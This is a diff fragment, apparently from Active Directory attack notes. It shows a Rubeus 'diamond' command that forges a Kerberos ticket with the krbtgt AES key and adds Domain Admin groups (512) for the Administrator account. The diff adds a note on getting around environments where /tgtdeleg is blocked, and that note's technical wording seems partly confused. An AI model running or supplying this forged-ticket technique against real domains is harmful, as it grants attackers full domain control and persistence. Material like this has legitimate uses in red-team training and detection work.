@@ -36,6 +36,8 @@ Get-DomainSID
 # Request a legitimate TGT, decrypt it with the krbtgt AES key, modify the PAC to include Domain Admin groups, re-encrypt, and inject.
 .\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator `
     /ticketuserid:500 /groups:512 /krbkey:KRBTGT_AES256_KEY /ptt
+
+# Note: In hardened enviroments where /tgtdeleg is blocked, use the traditional tgtdeleg bypass via Rubeus.exe asktgt or the /user:TargetUser$ method to request a renewable ticket first.
 ```
 
 ---
